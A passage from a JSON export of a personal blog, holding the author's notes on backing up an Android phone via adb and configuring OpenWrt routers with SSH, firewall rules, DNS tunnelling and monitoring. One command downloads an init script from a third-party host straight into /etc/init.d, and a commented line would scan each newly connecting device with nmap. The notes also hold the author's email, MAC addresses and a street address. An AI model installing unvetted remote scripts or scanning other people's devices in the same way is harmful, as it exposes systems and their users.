\"$MY_BACKUP_PATH\" Backup Call log: adb shell sqlite3 /data/data/com.android.providers.contacts/databases/contacts*.db 'select * from calls' &gt; \"$MY_BACKUP_PATH/calls\" Backup browser settings: adb shell sqlite3 /data/data/com.android.browser/databases/browser.db 'select * from bookmarks' &gt; \"$MY_BACKUP_PATH/bookmarks\" Backup some apps settings: adb pull /data/data/cgeo.geocaching/shared_prefs/cgeo.geocaching_preferences.xml \"$MY_BACKUP_PATH\" adb pull /data/data/cz.vojtisek.freesmssender/shared_prefs/cz.vojtisek.freesmssender_preferences.xml \"$MY_BACKUP_PATH\" adb pull /data/data/com.google.android.maps.mytracks/shared_prefs/SettingsActivity.xml \"$MY_BACKUP_PATH\" adb pull /data/data/com.google.android.maps.mytracks/databases/mytracks.db \"$MY_BACKUP_PATH\" adb pull /data/data/ru.org.amip.ClockSync/shared_prefs/ru.org.amip.ClockSync_preferences.xml \"$MY_BACKUP_PATH\" adb pull /data/data/menion.android.locus.pro/shared_prefs/menion.android.locus.pro_preferences.xml \"$MY_BACKUP_PATH\" adb pull /data/data/eu.inmite.apps.smsjizdenka/databases/smsjizdenka.db \"$MY_BACKUP_PATH\" adb pull /data/data/com.prey/shared_prefs/com.prey_preferences.xml \"$MY_BACKUP_PATH\" adb pull /data/data/com.newsrob/shared_prefs/com.newsrob_preferences.xml \"$MY_BACKUP_PATH\" adb pull /data/data/com.androidlost/shared_prefs/c2dmPref.xml \"$MY_BACKUP_PATH\" adb pull /data/data/com.android.keepass/shared_prefs/com.android.keepass_preferences.xml \"$MY_BACKUP_PATH\" Restore part + some additional configurations Configure dropbear (ssh) on the phone: adb remount adb push /home/pruzicka/.ssh/id_rsa.pub /sdcard/authorized_keys adb shell mkdir -p /data/dropbear/.ssh/ cp /sdcard/authorized_keys /data/dropbear/.ssh/ chmod 755 /data/dropbear chmod 700 /data/dropbear/.ssh chmod 600 /data/dropbear/.ssh/authorized_keys dropbearkey -t rsa -f /data/dropbear/dropbear_rsa_host_key dropbearkey -t dss -f /data/dropbear/dropbear_dss_host_key #echo \"export PATH=/usr/bin:/usr/sbin:/bin:/sbin:/system/sbin:/system/bin:/system/xbin:/system/xbin/bb:/data/local/bin\" &gt;&gt; /data/dropbear/.profile cat &gt;&gt; /etc/init.local.rc &lt;&lt; EOF # start Dropbear (ssh server) service on boot service sshd /system/xbin/dropbear -s user root group root oneshot EOF rm /system/app/RomManager.apk Set the default backup directory: MY_BACKUP_PATH=/var/tmp/android_backup Restore System WiFi Settings: adb push \"$MY_BACKUP_PATH/wpa_supplicant.conf\" /data/misc/wifi/ adb shell chown wifi:wifi /data/misc/wifi/wpa_supplicant.conf Restore Call log: adb push \"$MY_BACKUP_PATH/calls\" /sdcard/ adb shell sqlite3 /data/data/com.android.providers.contacts/databases/contacts*.db '.import /sdcard/calls calls' Restore some apps settings: adb shell mkdir -p /data/data/cgeo.geocaching/shared_prefs/ adb push \"$MY_BACKUP_PATH/cgeo.geocaching_preferences.xml\" /data/data/cgeo.geocaching/shared_prefs/ adb shell mkdir -p /data/data/cz.vojtisek.freesmssender/{shared_prefs,databases} adb push \"$MY_BACKUP_PATH/cz.vojtisek.freesmssender_preferences.xml\" /data/data/cz.vojtisek.freesmssender/shared_prefs/ adb push \"$MY_BACKUP_PATH/freesmssender\" /data/data/cz.vojtisek.freesmssender/databases/ adb shell mkdir -p /data/data/com.google.android.maps.mytracks/{shared_prefs,databases} adb push \"$MY_BACKUP_PATH/SettingsActivity.xml\" /data/data/com.google.android.maps.mytracks/shared_prefs/ adb push \"$MY_BACKUP_PATH/mytracks.db\" /data/data/com.google.android.maps.mytracks/databases/ adb shell mkdir -p /data/data/ru.org.amip.ClockSync/shared_prefs/ adb push \"$MY_BACKUP_PATH/ru.org.amip.ClockSync_preferences.xml\" /data/data/ru.org.amip.ClockSync/shared_prefs/ adb shell mkdir -p /data/data/menion.android.locus.pro/shared_prefs/ adb push \"$MY_BACKUP_PATH/menion.android.locus.pro_preferences.xml\" /data/data/menion.android.locus.pro/shared_prefs/ adb shell mkdir -p /data/data/eu.inmite.apps.smsjizdenka/databases/ adb push \"$MY_BACKUP_PATH/smsjizdenka.db\" /data/data/eu.inmite.apps.smsjizdenka/databases/ adb shell mkdir -p /data/data/com.prey/shared_prefs/ adb push \"$MY_BACKUP_PATH/com.prey_preferences.xml\" /data/data/com.prey/shared_prefs/ adb shell mkdir -p /data/data/com.newsrob/shared_prefs/ adb push \"$MY_BACKUP_PATH/com.newsrob_preferences.xml\" /data/data/com.newsrob/shared_prefs/ adb shell mkdir -p /data/data/com.androidlost/shared_prefs/ adb push \"$MY_BACKUP_PATH/c2dmPref.xml\" /data/data/com.androidlost/shared_prefs/ adb shell mkdir -p /data/data/com.android.keepass/shared_prefs/ adb push \"$MY_BACKUP_PATH/com.android.keepass_preferences.xml\" /data/data/com.android.keepass/shared_prefs/ Install the applications S2E, My Tracks, Free SMS Sender, c:geo and the others… Fix all permissions and reboot: adb shell fix_permissions # shellcheck disable=SC2016 # Single quotes intentional - $APP expands on Android device, not locally adb shell 'for APP in CarHomeGoogle.apk Email.apk GenieWidget.apk RomManager.apk Stk.apk Talk.apk; do rm -f /system/app/$APP; done' adb reboot Maybe you are asking why not to just copy the “.db” files (like it’s mentioned on most of the other pages). -&gt; the reason is that the structure of the sqlite db changed between CM versions and that’s the reason why a simple copy of the .db files is not working. Restore SMS data: adb push \"$MY_BACKUP_PATH/sms\" /sdcard/ adb shell sqlite3 /data/data/com.android.providers.telephony/databases/mmssms.db '.import /sdcard/sms sms' Restore browser settings: adb push \"$MY_BACKUP_PATH/bookmarks\" /sdcard/ adb shell sqlite3 /data/data/com.android.browser/databases/browser.db '.import /sdcard/bookmarks bookmarks'" }, { "title": "Another OpenWrt configuration", "url": "/posts/another-openwrt-configuration/", "categories": "OpenWrt, Networking, linux-old.xvx.cz", "tags": "tp-link, wifi, pxe, dnsmasq", "date": "2012-01-28 00:00:00 +0100", "content": "https://linux-old.xvx.cz/2012/01/another-openwrt-configuration/ I would like to describe another OpenWrt configuration. It’s going to be just a few examples on how to configure the latest available OpenWrt firmware Backfire 10.03.1. I’m going to use TP-Link TL-WR1043ND wifi router with a small 64MB USB stick /dev/sda1 containing an ext2 partition. I plan to have some stats on the USB stick and simple html pages as well. After flashing the original firmware with openwrt-ar71xx-tl-wr1043nd-v1-squashfs-factory.bin I installed the kernel related packages and extroot: (if you have OpenWRT already installed use: mtd -e firmware -r write /www2/openwrt-ar71xx-tl-wr1043nd-v1-squashfs-sysupgrade.bin firmware) telnet 192.168.1.1 passwd opkg update opkg install block-hotplug block-extroot kmod-fs-ext4 kmod-usb-storage uci set system.@system[0].hostname=openwrt uci set system.@system[0].timezone=CET-1CEST,M3.5.0,M10.5.0/3 uci set system.@system[0].timezone=CET-1CEST,M3.5.0,M10.5.0/3 uci set system.@system[0].log_file=/etc/messages uci set system.@system[0].log_size=1024 uci set system.@system[0].log_type=file uci set fstab.@mount[0].device=/dev/sda1 uci set fstab.@mount[0].fstype=ext4 uci set fstab.@mount[0].options=rw,sync uci set fstab.@mount[0].enabled=1 uci set fstab.@mount[0].enabled_fsck=0 uci set fstab.@mount[0].is_rootfs=1 uci set dropbear.@dropbear[0].Port=2222 uci add firewall rule uci set firewall.@rule[-1].name=ssh uci set firewall.@rule[-1].src=wan uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=tcp uci set firewall.@rule[-1].dest_port=2222 uci add firewall rule uci set firewall.@rule[-1].name=iodined uci set firewall.@rule[-1].src=wan uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=udp uci set firewall.@rule[-1].dest_port=53 uci add firewall rule uci set firewall.@rule[-1].name=snmp uci set firewall.@rule[-1].src=wan uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=udp uci set firewall.@rule[-1].dest_port=161 uci add firewall rule uci set firewall.@rule[-1].name=http_ser uci set firewall.@rule[-1].src=lan uci set firewall.@rule[-1].dst=wan uci set firewall.@rule[-1].src_ip=192.168.0.0/24 uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=tcp uci set firewall.@rule[-1].dest_port=80 uci set wireless.@wifi-iface[-1].ssid=ser uci set wireless.@wifi-iface[-1].encryption=psk2 uci set wireless.@wifi-iface[-1].key=xxxxxxxx uci set wireless.radio0.channel=3 uci set wireless.radio0.htmode=HT40 uci del wireless.@wifi-device[0].disabled uci set network.lan.ipaddr=192.168.0.1 uci set dhcp.@dnsmasq[0].domain=ser.no-ip.org uci set dhcp.@dnsmasq[0].leasefile=/etc/dnsmasq-dhcp.leases uci set dhcp.@dnsmasq[0].port=0 uci set dhcp.@dnsmasq[0].cachelocal=0 uci set dhcp.lan.dhcp_option=6,8.8.8.8 uci set dhcp.lan.start=200 uci set dhcp.lan.limit=254 uci add dhcp host uci set dhcp.@host[-1].name=ruz uci set dhcp.@host[-1].ip=192.168.0.2 uci set dhcp.@host[-1].mac=XX:XX:XX:XX:XX:XX Configure the ssh to enable autologin: scp \"$HOME/.ssh/id_rsa.pub\" root@192.168.1.1:/tmp/authorized_keys ssh root@192.168.1.1 cp /tmp/authorized_keys /etc/dropbear/authorized_keys chmod 600 /etc/dropbear/authorized_keys Install a few applications: opkg update opkg install --force-overwrite htop less openssh-sftp-server tcpdump wget-nossl Configure ssmtp for the outgoing emails: opkg install msmtp-nossl sed -i 's/^\\(host\\).*/\\1 smtp.XXXXXX.cz/' /etc/msmtprc cat &gt;&gt; /etc/msmtprc &lt;&lt; EOF auto_from on maildomain ser.no-ip.org EOF # shellcheck disable=SC2016 # Single quotes intentional - backticks expand on router, not locally sed -i '/^exit 0/i echo -e \"Subject: Reboot `uci get system.@system[0].hostname`\\\\n\\\\nOpenwrt rebooted: `date`\\\\n\\\\n`grep -B 50 \\\\\"syslogd started\\\\\" /etc/messages`\" | sendmail petr.ruzicka@gmail.com' /etc/rc.local Configure DDNS: opkg install luci-app-ddns uci set ddns.myddns.enabled=1 uci set ddns.myddns.service_name=no-ip.com uci set ddns.myddns.domain=ser.no-ip.org uci set ddns.myddns.username=ruz uci set ddns.myddns.password=XXXXXXXXXXX Install snmpd: opkg install mini-snmpd uci set mini_snmpd.@mini_snmpd[0].interfaces=lo,br-lan,eth0.2,eth0.1 uci set mini_snmpd.@mini_snmpd[0].community=OpenWrt uci set mini_snmpd.@mini_snmpd[0].location='Ser' uci set mini_snmpd.@mini_snmpd[0].contact='Ser' uci set mini_snmpd.@mini_snmpd[0].disks='/tmp,/overlay' /etc/init.d/mini_snmpd enable Configure TFTPboot and dnsmasq script: mkdir /tftpboot wget -P /tftpboot http://static.netboot.me/gpxe/netbootme.kpxe uci set dhcp.@dnsmasq[0].enable_tftp=1 uci set dhcp.@dnsmasq[0].tftp_root=/tftpboot uci set dhcp.@dnsmasq[0].dhcp_boot=netbootme.kpxe echo \"dhcp-script=/etc/dnsmasq-script.sh\" &gt;&gt; /etc/dnsmasq.conf cat &gt; /etc/dnsmasq-script.sh &lt;&lt; \\EOF #!/bin/sh /bin/echo $(/bin/date +\"%F %T\") $* &gt;&gt; /www2/dnsmasq.script.log if [ \"$1\" == \"add\" ] &amp;&amp; ! grep -iq \"$2\" /etc/config/dhcp; then echo -e \"Subject: New MAC on $(uci get system.@system[0].hostname).$(uci get dhcp.@dnsmasq[0].domain)\\\\n\\\\n$(/bin/date +\"%F %T\") $*\" | sendmail petr.ruzicka@gmail.com fi EOF chmod a+x /etc/dnsmasq-script.sh Configuration of iodined server (dns-tunelling) opkg install iodined uci set iodined.@iodined[0].address=XX.XXX.XX.XX uci set iodined.@iodined[0].password=XXXXXXXX uci set iodined.@iodined[0].tunnelip=192.168.99.1 uci set iodined.@iodined[0].tld=tunnel.XXXXX.cz /etc/init.d/iodined enable Configure httpd daemon for the /www2: opkg install px5g uhttpd-mod-tls uci del uhttpd.main.listen_http uci set uhttpd.px5g.days=3650 uci set uhttpd.px5g.country=CZ uci set uhttpd.px5g.state=\"Czech Republic\" uci set uhttpd.px5g.location=Brno rm /etc/uhttpd.crt /etc/uhttpd.key uci set uhttpd.main.listen_https=\"0.0.0.0:443\" mkdir -p /www2/vnstat uci set uhttpd.my=uhttpd uci set uhttpd.my.listen_http=\"0.0.0.0:80\" uci set uhttpd.my.home=/www2 Set the checking time for watchcat for 1 hour: opkg install watchcat /etc/uci-defaults/50-watchcat uci set system.@watchcat[0].period=1h /etc/init.d/watchcat enable uci commit reboot Repeat the previous steps and continue… You need to repeat it, because your router now reads the configs from “empty” USB stick and not from internal memory. If you remove the USB stick OpenWrt will read the configs from the memory. Configure statistics (collectd): opkg install luci-app-statistics opkg install collectd-mod-cpu collectd-mod-disk collectd-mod-irq collectd-mod-ping collectd-mod-processes collectd-mod-tcpconns uci set luci_statistics.collectd_rrdtool.DataDir=/etc/collectd uci set luci_statistics.collectd_ping.enable=1 uci set luci_statistics.collectd_ping.Hosts=www.google.com uci set luci_statistics.collectd_df.enable=1 uci set luci_statistics.collectd_df.Devices=/dev/sda1 uci set luci_statistics.collectd_df.MountPoints=/overlay uci set luci_statistics.collectd_df.FSTypes=fuseblk uci set luci_statistics.collectd_disk.enable=1 uci set luci_statistics.collectd_disk.Disks=sda uci set luci_statistics.collectd_interface.Interfaces=\"eth0.2 wlan0 eth0.1\" uci set luci_statistics.collectd_irq.enable=1 uci set luci_statistics.collectd_tcpconns.LocalPorts=\"2222 80 443\" uci set luci_statistics.collectd_rrdtool.CacheTimeout=120 uci set luci_statistics.collectd_rrdtool.CacheFlush=900 /etc/init.d/luci_statistics enable /etc/init.d/collectd enable opkg install luci-app-vnstat vnstat vnstati mkdir /etc/vnstat sed -i 's@^\\(DatabaseDir\\).*@\\1 \"/overlay/etc/vnstat\"@' /etc/vnstat.conf vnstat -u -i eth0.2 vnstat -u -i wlan0 vnstat -u -i eth0.1 /etc/init.d/vnstat enable /etc/init.d/vnstat start echo \"*/5 * * * * vnstat -u\" &gt;&gt; /etc/crontabs/root cat &gt; /etc/graphs-vnstat.sh &lt;&lt; \\EOF #!/bin/sh # vnstati image generation script. # Source: http://code.google.com/p/x-wrt/source/browse/trunk/package/webif/files/www/cgi-bin/webif/graphs-vnstat.sh WWW_D=/www2/vnstat # output images to here LIB_D=$(awk -F \\\" '/^DatabaseDir/ { print $2 }' /etc/vnstat.conf) # db location BIN=/usr/bin/vnstati # which vnstati outputs=\"s h d t m\" # what images to generate # Sanity checks [ -d \"$WWW_D\" ] || mkdir -p \"$WWW_D\" # make the folder if it doesn't exist. # End of config changes interfaces=\"$(ls -1 $LIB_D)\" if [ -z \"$interfaces\" ]; then echo \"No database found, nothing to do.\" echo \"A new database can be created with the following command: \" echo \" vnstat -u -i eth0\" exit 0 else for interface in $interfaces; do for output in $outputs; do $BIN -${output} -i $interface -o $WWW_D/vnstat_${interface}_${output}.png done done fi exit 1 EOF chmod a+x /etc/graphs-vnstat.sh echo \"*/31 * * * * /etc/graphs-vnstat.sh\" &gt;&gt; /etc/crontabs/root cat &gt; /www2/vnstat/index.html &lt;&lt; \\EOF &lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"300\"&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Traffic of OpenWRT interfaces&lt;/title&gt; &lt;/head&gt; &lt;body&gt; EOF for IFCE in \"$(awk -F \\\" '/^DatabaseDir/ { print $2 }' /etc/vnstat.conf)\"/*; do cat &gt;&gt; /www2/vnstat/index.html &lt;&lt; EOF &lt;h3&gt;Traffic of Interface $IFCE&lt;/h3&gt; &lt;table&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td&gt; &lt;img src=\"vnstat_${IFCE}_s.png\" alt=\"$IFCE Summary\" /&gt; &lt;/td&gt; &lt;td&gt; &lt;img src=\"vnstat_${IFCE}_h.png\" alt=\"$IFCE Hourly\" /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=\"top\"&gt; &lt;img src=\"vnstat_${IFCE}_d.png\" alt=\"$IFCE Daily\" /&gt; &lt;/td&gt; &lt;td valign=\"top\"&gt; &lt;img src=\"vnstat_${IFCE}_t.png\" alt=\"$IFCE Top 10\" /&gt; &lt;img src=\"vnstat_${IFCE}_m.png\" alt=\"$IFCE Monthly\" /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; EOF done cat &gt;&gt; /www2/vnstat/index.html &lt;&lt; \\EOF &lt;/body&gt; &lt;/html&gt; EOF Configure the nodogsplash: opkg install nodogsplash cp nodogsplash.conf nodogsplash.conf-orig sed -i \"s/\\(^GatewayInterface\\).*/\\1 br-lan/;s/^# \\(GatewayName\\).*/\\1 Ser/;s/\\(.*FirewallRule allow tcp port 80\\)$/#\\1/;s@^# \\(GatewayIPRange\\).*@\\1 192.168.0.192/26@;/FirewallRule block to 10.0.0.0\\/8/a\\ \\ \\ \\ FirewallRule allow tcp port 80\" /etc/nodogsplash/nodogsplash.conf sed -i \"/&lt;td align=center height=\\\"120\\\"&gt;/a\\ &lt;h3&gt;For Internet access - click the dog&lt;/h3&gt;\\ &lt;h3&gt;Pro pristup na Internet klikni na psa.&lt;/h3&gt;\\ \" /etc/nodogsplash/htdocs/splash.html /etc/init.d/nodogsplash enable uci commit reboot That’s all… ;-) Happy OpenWRTing…" }, { "title": "OpenWrt (Backfire 10.03) and TL-WR1043ND", "url": "/posts/openwrt-backfire-1003-and-tl-wr1043nd/", "categories": "OpenWrt, Networking, linux-old.xvx.cz", "tags": "tp-link, wifi, dnsmasq", "date": "2011-12-13 00:00:00 +0100", "content": "https://linux-old.xvx.cz/2011/12/openwrt-backfire-10-03-and-tl-wr1043nd/ I forgot to publish this article almost a year ago :-( So now it’s a good time before I’ll write another one… It’s OUTDATED and INCOMPLETE, but it can still bring some light… A few days ago I bought the WiFi router TP-Link TL-WR1043ND. The main reason was the USB, Gigabit Ethernet ports, 802.11n and support in latest OpenWrt. OpenWrt is an amazing project which can create a really powerful device from wifi routers. I spent many days collecting various information about OpenWrt, because I want to use a web camera, USB hub, external USB storage and later a few thermometers. I decided to compile it from scratch (using Fedora 13), because squashfs can’t work with block-extroot without building an image (see https://forum.openwrt.org/viewtopic.php?pid=108642). I prefer to use squashfs, because some people say it’s better than jffs2. Here you can find my notes… Download necessary packages to compile OpenWrt: yum install subversion gcc-c++ libz-dev flex unzip ncurses-devel zlib-devel Download OpenWrt Backfire from svn: cd /var/tmp/ || exit svn co svn://svn.openwrt.org/openwrt/branches/backfire or use the standard way: cd /var/tmp/ || exit wget http://downloads.openwrt.org/backfire/10.03/backfire_10.03_source.tar.bz2 tar xvjf backfire_10.03_source.tar.bz2 mv backfire_10.03 backfire Start configuring it: cd backfire/ || exit ./scripts/feeds update ./scripts/feeds install xxx make menuconfig Select following items in the menuconfig and the items from the command below: Target System (Atheros AR71xx/AR7240/AR913x) Target Profile (TP-LINK TL-WR1043ND v1) Kernel modules ---&gt; Filesystems ---&gt; kmod-fs-ext2 Kernel modules ---&gt; USB Support ---&gt; kmod-usb-core Kernel modules ---&gt; USB Support ---&gt; kmod-usb-storage Kernel modules ---&gt; USB Support ---&gt; kmod-usb-video Kernel modules ---&gt; USB Support ---&gt; kmod-usb-serial Kernel modules ---&gt; USB Support ---&gt; kmod-usb-serial-pl2303 Kernel modules ---&gt; Video Support ---&gt; kmod-video-core Kernel modules ---&gt; Video Support ---&gt; kmod-video-uvc Utilities ---&gt; disc ---&gt; block-extroot #Base system ---&gt; block-extroot and all the packages you installed before Run make V=99 to compile it. I’ll put all the root files to the USB disk and I formatted my 500MB USB stick this way: root@fedora:/# parted -s /dev/sda p Model: Generic STORAGE DEVICE (scsi) Disk /dev/sda: 492MB Sector size (logical/physical): 512B/512B Partition Table: msdos Number Start End Size Type File system Flags 1 16.4kB 450MB 450MB primary ext2 2 450MB 492MB 41.9MB primary linux-swap(v1) Connect router to your desktop/laptop and flash it from the webgui using this file: openwrt-ar71xx-tl-wr1043nd-v1-squashfs-factory.bin or use these commands if you already have OpenWrt installed: scp ./backfire/bin/ar71xx/openwrt-ar71xx-tl-wr1043nd-v1-squashfs-sysupgrade.bin root@192.168.0.2:/tmp sysupgrade openwrt-ar71xx-tl-wr1043nd-v1-squashfs-sysupgrade.bin #scp ./backfire/bin/ar71xx/openwrt-ar71xx-tl-wr1043nd-v1-squashfs-sysupgrade.bin root@192.168.0.2:/tmp #mtd -e firmware -r write /tmp/openwrt-ar71xx-tl-wr1043nd-v1-squashfs-sysupgrade.bin firmware Set your password using telnet command and setup up block-extroot (Rootfs on External Storage) and use my USB stick as root partition to have more space: ifconfig eth0 192.168.1.2 netmask 255.255.255.0 telnet 192.168.1.1 uci set fstab.@mount[0].fstype=ext2 uci set fstab.@mount[0].device=/dev/sda1 uci set fstab.@mount[0].is_rootfs=1 uci set fstab.@mount[0].enabled_fsck=1 uci set fstab.@mount[0].target=/mnt uci set fstab.@mount[0].enabled=1 uci commit fstab passwd reboot Turn on the swap: uci set fstab.@swap[0].device=/dev/sda2 uci set fstab.@swap[0].enabled=1 Add option force_space in /etc/opkg.conf to allow installation of packets bigger than your /rom partitions free space: echo option force_space &gt;&gt; /etc/opkg.conf Setup the ssh key to enable autologin: scp \"$HOME/.ssh/id_rsa.pub\" root@192.168.0.2:/tmp/authorized_keys ssh root@192.168.0.2 cp /tmp/authorized_keys /etc/dropbear/authorized_keys chmod 600 /etc/dropbear/authorized_keys Configure getting DHCP requests from WAN (Internet) port, wifi and firewall: uci set network.lan.ipaddr=192.168.0.193 uci set network.lan.netmask=255.255.255.192 uci set network.wan.ifname=eth0.2 uci set network.wan.proto=static uci set network.wan.type=bridge uci set network.wan.ipaddr=192.168.0.2 uci set network.wan.netmask=255.255.255.192 uci set network.wan.dns=\"192.168.0.1 8.8.8.8\" uci set network.wan.gateway=192.168.0.1 uci set network.wifi_open=interface uci set network.wifi_open.ifname=eth0.3 uci set network.wifi_open.type=bridge uci set network.wifi_open.proto=static uci set network.wifi_open.ipaddr=192.168.0.129 uci set network.wifi_open.netmask=255.255.255.192 uci set network.wifi_priv=interface uci set network.wifi_priv.ifname=eth0.1 uci set network.wifi_priv.type=bridge uci set network.wifi_priv.proto=static uci set network.wifi_priv.ipaddr=192.168.0.65 uci set network.wifi_priv.netmask=255.255.255.192 uci add network switch_vlan uci set network.@switch_vlan[-1].device=rtl8366rb uci set network.@switch_vlan[-1].vlan=3 uci set network.@switch_vlan[-1].ports=5 uci set wireless.@wifi-iface[0].ssid=test123 uci set wireless.@wifi-iface[0].network=wifi_open uci set wireless.@wifi-iface[0].encryption=psk2 uci set wireless.@wifi-iface[0].key=yyyyyyyy uci set wireless.@wifi-iface[0].isolate=1 uci add wireless wifi-iface uci set wireless.@wifi-iface[-1].device=radio0 uci set wireless.@wifi-iface[-1].network=wifi_priv uci set wireless.@wifi-iface[-1].mode=ap uci set wireless.@wifi-iface[-1].ssid=test345 uci set wireless.@wifi-iface[-1].encryption=psk2 uci set wireless.@wifi-iface[-1].key=yyyyyyyy uci set wireless.radio0.channel=8 uci set wireless.radio0.country=CZ uci set wireless.radio0.hwmode=11ng uci del wireless.@wifi-device[0].disabled uci set firewall.@zone[1].conntrack=1 uci set firewall.@zone[1].forward=ACCEPT uci set firewall.@zone[1].input=ACCEPT uci add firewall zone uci set firewall.@zone[-1].name=wifi_open uci set firewall.@zone[-1].input=REJECT uci set firewall.@zone[-1].output=ACCEPT uci set firewall.@zone[-1].forward=REJECT uci set firewall.@zone[-1].conntrack=1 uci add firewall zone uci set firewall.@zone[-1].name=wifi_priv uci set firewall.@zone[-1].input=ACCEPT uci set firewall.@zone[-1].output=ACCEPT uci set firewall.@zone[-1].forward=REJECT uci add firewall forwarding uci set firewall.@forwarding[-1].src=wifi_open uci set firewall.@forwarding[-1].dst=wan uci add firewall forwarding uci set firewall.@forwarding[-1].src=wifi_priv uci set firewall.@forwarding[-1].dst=wan uci add firewall rule uci set firewall.@rule[-1].name=icmp-echo-request uci set firewall.@rule[-1].src=wifi_open uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=icmp uci set firewall.@rule[-1].icmp_type=echo-request uci add firewall rule uci set firewall.@rule[-1].name=dhcp uci set firewall.@rule[-1].src=wifi_open uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=udp uci set firewall.@rule[-1].src_port=68 uci set dhcp.@dnsmasq[0].domain=xvx.cz uci set dhcp.@dnsmasq[0].port=0 uci set dhcp.@dnsmasq[0].cachelocal=0 uci set dhcp.@dnsmasq[0].dhcpscript=/etc/dnsmasq.script uci set dhcp.wifi_open=dhcp uci set dhcp.wifi_open.interface=wifi_open uci set dhcp.wifi_open.start=130 uci set dhcp.wifi_open.limit=60 uci set dhcp.wifi_open.dhcp_option=6,192.168.0.1 uci set dhcp.wifi_priv=dhcp uci set dhcp.wifi_priv.interface=wifi_priv uci set dhcp.wifi_priv.start=70 uci set dhcp.wifi_priv.limit=60 uci set dhcp.wifi_priv.dhcp_option=6,192.168.0.1 uci set dhcp.lan.start=194 uci set dhcp.lan.limit=60 uci set dhcp.lan.dhcp_option=6,192.168.0.1 uci add dhcp host uci set dhcp.@host[-1].name=peru-nb-work uci set dhcp.@host[-1].ip=192.168.0.66 uci set dhcp.@host[-1].mac=00:1C:65:38:7C:F6 uci add dhcp host uci set dhcp.@host[-1].name=peru-nb uci set dhcp.@host[-1].ip=192.168.0.67 uci set dhcp.@host[-1].mac=00:15:00:11:48:5a uci add dhcp host uci set dhcp.@host[-1].name=phone uci set dhcp.@host[-1].ip=192.168.0.68 uci set dhcp.@host[-1].mac=00:23:76:d6:42:c7 uci add dhcp host uci set dhcp.@host[-1].name=palm uci set dhcp.@host[-1].ip=192.168.0.69 uci set dhcp.@host[-1].mac=00:0b:6c:57:da:9a wget http://rpc.one.pl/pliki/openwrt/backfire/10.03.x/dnsmasq/dnsmasq -O /etc/init.d/dnsmasq Set the hostname, timezone and configure syslogd: uci set system.@system[0].timezone=CET-1CEST,M3.5.0,M10.5.0/3 uci set system.@system[0].timezone=CET-1CEST,M3.5.0,M10.5.0/3 uci set system.@system[0].log_size=64 uci set system.@system[0].log_ip=192.168.0.1 Configure certificate details for https: uci set uhttpd.px5g.days=3650 uci set uhttpd.px5g.country=CZ uci set uhttpd.px5g.state=\"Czech Republic\" uci set uhttpd.px5g.location=Brno rm /etc/uhttpd.crt /etc/uhttpd.key Configure darkstat, snmpd and vnstat. uci set darkstat.@darkstat[0].interface=wan uci set mini_snmpd.@mini_snmpd[0].interfaces=lo,br-wan,br-wifi_open,br-wifi_private uci set mini_snmpd.@mini_snmpd[0].community=OpenWrt uci set mini_snmpd.@mini_snmpd[0].location='V Ujezdech 1, Brno' uci set mini_snmpd.@mini_snmpd[0].contact='PeRu' Few more commands to configure “non-uci” files: sed -i 's/\\(^mailhub\\).*/\\1=gate.xvx.cz/;s/\\(^rewriteDomain=\\).*/\\1xvx.cz/' /etc/ssmtp/ssmtp.conf sed -i 's/\\(^GatewayInterface\\).*/\\1 br-wifi_open/;s/^# \\(GatewayName\\).*/\\1 Medlanky/;s/^\\([[:space:]]*FirewallRule allow tcp port 80\\)/#\\1/;s/\\(.*FirewallRule allow tcp port 22\\)/#\\1/;s/\\(.*FirewallRule allow tcp port 443\\)/#\\1/;/^FirewallRuleSet authenticated-users/a\\ FirewallRule allow' /etc/nodogsplash/nodogsplash.conf sed -i 's@\\(\\)@\\1\\n &lt;h3&gt;For Internet access - click the dog&lt;/h3&gt; \\n &lt;h3&gt;Pro pristup na Internet klikni na psa.&lt;/h3&gt; @' /etc/nodogsplash/htdocs/splash.html cat &gt; /etc/dnsmasq.script &lt;&lt; \\EOF #!/bin/sh /bin/echo `/bin/date +\"%F %T\"` $* &gt;&gt; /tmp/dnsmasq.script.log case $1 in \"add\") #grep -q $2 /etc/config/dhcp || /usr/bin/nmap -T4 -A $3 | ssmtp petr.ruzicka@gmail.com #echo \"Subject: New connection to `hostname` ($2 $3)\\n\\n`/usr/bin/nmap -T4 -A $3`\" | ssmtp petr.ruzicka@gmail.com echo \"ADD: MAC: $MAC; DNSMASQ_LEASE_LENGTH: $DNSMASQ_LEASE_LENGTH; DNSMASQ_LEASE_EXPIRES: $DNSMASQ_LEASE_EXPIRES; DNSMASQ_TIME_REMAINING: $DNSMASQ_TIME_REMAINING; DNSMASQ_TAGS: $DNSMASQ_TAGS\" &gt;&gt; /tmp/dnsmasq.script.log ;; \"old\") echo \"OLD: MAC: $MAC; DNSMASQ_LEASE_LENGTH: $DNSMASQ_LEASE_LENGTH; DNSMASQ_LEASE_EXPIRES: $DNSMASQ_LEASE_EXPIRES; DNSMASQ_TIME_REMAINING: $DNSMASQ_TIME_REMAINING; DNSMASQ_TAGS: $DNSMASQ_TAGS\" &gt;&gt; /tmp/dnsmasq.script.log ;; \"del\") echo \"DEL: MAC: $MAC; DNSMASQ_LEASE_LENGTH: $DNSMASQ_LEASE_LENGTH; DNSMASQ_LEASE_EXPIRES: $DNSMASQ_LEASE_EXPIRES; DNSMASQ_TIME_REMAINING: $DNSMASQ_TIME_REMAINING; DNSMASQ_TAGS: $DNSMASQ_TAGS\" &gt;&gt; /tmp/dnsmasq.script.log ;; esac EOF chmod a+x /etc/dnsmasq.script cat &gt;&gt; /etc/digitemp.script &lt;&lt; \\EOF #!/bin/sh /usr/bin/digitemp_DS9097 -c/etc/digitemp.conf -a -n0 -d10 -q -s/dev/ttyUSB0 -o\"PUTVAL OpenWrt/temp/temperature-%s interval=10 %N:%.2C\" EOF chmod a+x /etc/digitemp.script mkdir /root/.ssh/ dropbearkey -t rsa -f /root/.ssh/id_rsa # Save the public key to the ~/.ssh/authorized_keys on the server cat 